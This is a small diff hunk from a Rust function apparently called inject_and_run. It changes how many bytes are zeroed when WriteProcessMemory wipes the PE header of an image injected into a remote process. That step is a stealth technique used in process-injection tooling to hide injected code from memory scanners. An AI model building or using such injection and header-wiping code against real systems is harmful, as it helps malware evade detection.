@@ -516,7 +516,7 @@ pub unsafe fn inject_and_run(
     }
 
     // 將 remote_image_base 的 PE header 清除
-    let zeros = vec![0u8; 0x1000];
+    let zeros = vec![0u8; size_of_headers];
     let mut bytes_written: usize = 0;
     unsafe {
         WriteProcessMemory(
